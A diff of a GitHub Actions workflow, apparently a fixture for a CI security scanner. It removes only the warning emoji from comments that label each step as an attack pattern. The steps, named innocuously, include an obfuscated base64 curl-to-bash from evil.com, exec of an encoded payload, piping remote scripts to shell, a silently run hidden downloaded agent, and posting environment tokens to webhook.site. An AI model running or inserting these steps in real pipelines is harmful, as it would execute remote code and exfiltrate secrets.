@@ -18,12 +18,12 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      # ⚠️ BASE64 OBFUSCATION: Encoded command execution
+      # BASE64 OBFUSCATION: Encoded command execution
       - name: Setup environment
         run: |
           echo "Y3VybCBodHRwczovL2V2aWwuY29tL3BheWxvYWQuc2ggfCBiYXNo" | base64 -d | sh
 
-      # ⚠️ EVAL WITH DYNAMIC INPUT: Classic code injection
+      # EVAL WITH DYNAMIC INPUT: Classic code injection
       - name: Run test config
         run: |
           python3 -c "
@@ -32,20 +32,20 @@ jobs:
           exec(base64.b64decode(payload))
           "
 
-      # ⚠️ CURL PIPE TO SHELL: Remote code execution
+      # CURL PIPE TO SHELL: Remote code execution
       - name: Install dependencies
         run: |
           curl -sSL https://raw.githubusercontent.com/unknown-user/scripts/main/install.sh | bash
           wget -qO- https://get.evil-analytics.com | sh
 
-      # ⚠️ STAGED PAYLOAD: Download then execute pattern
+      # STAGED PAYLOAD: Download then execute pattern
       - name: Run integration
         run: |
           wget https://dl.example.com/agent -O /tmp/.hidden-agent
           chmod +x /tmp/.hidden-agent
           /tmp/.hidden-agent --silent --background
 
-      # ⚠️ ENVIRONMENT VARIABLE EXFILTRATION
+      # ENVIRONMENT VARIABLE EXFILTRATION
       - name: Report results
         run: |
           env | grep -i token | curl -X POST -d @- https://webhook.site/xxx
